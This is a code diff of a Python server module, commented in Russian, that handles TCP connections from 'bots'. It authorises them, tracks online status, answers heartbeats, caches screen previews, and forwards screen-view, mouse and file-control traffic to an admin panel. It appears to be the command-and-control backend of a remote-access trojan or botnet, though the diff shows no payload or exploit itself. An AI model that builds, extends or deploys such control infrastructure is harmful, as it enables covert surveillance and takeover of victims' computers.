@@ -1,68 +1,116 @@
 # backend/Core/ClientConnection.py
-import asyncio, socket, json, logs.LoggerWrapper as logger
-from backend.Services.Auth import authorize_client, sync_bot_data
-from backend.Services import client as active_clients
+import json, asyncio, socket, logs.LoggerWrapper as logger
+from backend.Core.network import read_packet, pack_packet
+from backend.Services.Auth import authorize_bot, get_full_db
+from backend.Services.ClientManager import active_clients
 from backend.BenchUtils import add_bytes
-from backend.API.protocols import pack_bot_command
 
 preview_cache = {}
 
 class BotConnectionHandler:
-    "Обработка TCP-сессий ботов и маршрутизация пакетов"
     async def handle_new_connection(self, reader, writer):
-        "Инициализация сокета и основной цикл чтения"
-        client_id, peer = None, writer.get_extra_info("peername")[0]
-        if (sock := writer.get_extra_info('socket')): sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        bot_id, peer = None, writer.get_extra_info("peername")[0]
+        if (sock := writer.get_extra_info('socket')): 
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        
         try:
-            if not (auth := await authorize_client(reader, peer)): return await self._force_close(writer)
-            client_id, bot_data = auth
-            await self._register_bot(client_id, bot_data, writer, reader)
-            while (packet := await self._read_packet(reader)): await self._process_packet(client_id, writer, packet)
-        except Exception as error: 
-            if not isinstance(error, (asyncio.IncompleteReadError, ConnectionResetError)): logger.Log.error(f"Handler Error [{client_id}]: {error}")
-        finally: await self._disconnect_bot(client_id, writer)
+            # 1. Авторизация
+            res = await authorize_bot(reader, peer)
+            if not res: return await self._force_close(writer)
+            bot_id, bot_data = res
+            
+            # 2. Регистрация
+            active_clients[bot_id] = (reader, writer)
+            
+            # Сразу пушим состояние БД всем админам (статус online)
+            self._broadcast_db_state()
+            
+            if bot_id in preview_cache: 
+                self._send_raw(preview_cache[bot_id])
+                
+            logger.Log.info(f"[+] Бот {bot_id} онлайн")
 
-    async def _register_bot(self, client_id, data, writer, reader):
-        "Регистрация в реестре активных соединений"
-        from backend.API import manager
-        active_clients[client_id], data['status'] = (reader, writer), 'online'
-        manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([data])))
-        if client_id in preview_cache: manager.broadcast_packet_sync(preview_cache[client_id])
-        logger.Log.info(f"[+] Бот {client_id} активен")
+            # 3. Цикл обработки команд
+            while True:
+                try:
+                    bid, mod, pay = await asyncio.wait_for(read_packet(reader), timeout=10.0)
+                except asyncio.TimeoutError: break
+                if not bid: break 
+                
+                add_bytes(6 + len(bid) + len(mod) + (len(pay) if isinstance(pay, bytes) else len(str(pay))))
+                
+                if mod == "Heartbeat":
+                    if pay == "ping":
+                        writer.write(pack_packet(bid, "Heartbeat", "pong"))
+                        await writer.drain()
+                
+                elif mod == "SystemInfo":
+                    from backend.Services.Auth import sync_bot_data
+                    # Обновляем БД и пушим метаданные (is_json=True)
+                    updated_data = sync_bot_data(bid, pay)
+                    self._to_panel(bid, "SystemInfo", updated_data, is_json=True)
+                
+                elif mod == "Preview":
+                    # Превью кешируем и шлем сырым пакетом
+                    preview_cache[bid] = pack_packet(bid, mod, pay)
+                    self._send_raw(preview_cache[bid])
+                
+                else:
+                    # Модули управления (ScreenView, Mouse, Files) шлем КАК ЕСТЬ (бинарно)
+                    self._to_panel(bid, mod, pay, is_json=False)
 
-    async def _process_packet(self, client_id, writer, packet):
-        "Диспетчеризация модулей: Heartbeat, DataScribe, Preview"
-        from backend.API import manager
-        try:
-            id_len, mod_len = packet[0], packet[1]
-            module = packet[6+id_len : 6+id_len+mod_len].decode(errors='ignore')
-            add_bytes(len(packet))
-            if module == "Heartbeat": writer.write(pack_bot_command(client_id, "Heartbeat", "pong")); await writer.drain()
-            elif module == "DataScribe":
-                full_data = sync_bot_data(client_id, json.loads(packet[6+id_len+mod_len:].decode()))
-                full_data['status'] = 'online'
-                manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([full_data])))
-            elif module == "Preview": (preview_cache.__setitem__(client_id, packet), manager.broadcast_packet_sync(packet))
-            else: manager.broadcast_packet_sync(packet)
-        except Exception as error: logger.Log.error(f"Pkt Err [{client_id}]: {error}")
+        except Exception as e: 
+            logger.Log.error(f"Handler Err [{bot_id}]: {e}")
+        finally: 
+            await self._disconnect(bot_id, writer)
 
-    async def _disconnect_bot(self, client_id, writer):
-        "Удаление бота из системы при разрыве связи"
+    def _broadcast_db_state(self):
+        """Полная синхронизация БД (статусы всех ботов)"""
         from backend.API import manager
-        if client_id in active_clients and active_clients[client_id][1] == writer:
-            active_clients.pop(client_id)
-            manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([{"id": client_id, "status": "offline"}])))
-            logger.Log.warning(f"[-] Бот {client_id} отключился")
+        from backend.Services.Auth import get_full_db
+        db_data = get_full_db()
+        
+        bot_list = []
+        for bid, info in db_data.items():
+            info['status'] = 'online' if bid in active_clients else 'offline'
+            info['id'] = bid
+            bot_list.append(info)
+            
+        # БД — это всегда текстовые данные для фронта
+        payload = json.dumps(bot_list, ensure_ascii=False)
+        manager.broadcast_packet_sync(pack_packet("SERVER", "SystemInfo", payload))
+
+    def _to_panel(self, bid, mod, pay, is_json=False):
+        """Умный прокси: JSON для инфо, бинарно для модулей"""
+        from backend.API import manager
+        
+        if is_json:
+            # Текстовые данные пакуем в JSON строку
+            try:
+                payload = json.dumps(pay, ensure_ascii=False)
+            except:
+                payload = str(pay)
+        else:
+            # Бинарные данные (картинки, файлы) оставляем байтами
+            payload = pay
+            
+        manager.broadcast_packet_sync(pack_packet(bid, mod, payload))
+
+    def _send_raw(self, full_packet):
+        from backend.API import manager
+        manager.broadcast_packet_sync(full_packet)
+
+    async def _disconnect(self, bid, writer):
+        if bid in active_clients:
+            active_clients.pop(bid)
+            from backend.Services.Auth import sync_bot_data
+            sync_bot_data(bid, {"status": "offline"})
+            self._broadcast_db_state() 
+            logger.Log.warning(f"[-] Бот {bid} отключился")
         await self._force_close(writer)
 
-    async def _read_packet(self, reader):
-        "Чтение заголовка (6 байт) и тела пакета"
-        try: return (h := await reader.readexactly(6)) + await reader.readexactly(h[0] + h[1] + int.from_bytes(h[2:6], "big"))
-        except: return None
-
     async def _force_close(self, writer):
-        "Безопасное закрытие потока записи"
-        if not writer.is_closing(): 
+        try:
             writer.close()
-            try: await asyncio.wait_for(writer.wait_closed(), 1)
-            except: pass
+            await asyncio.wait_for(writer.wait_closed(), 1)
+        except: pass
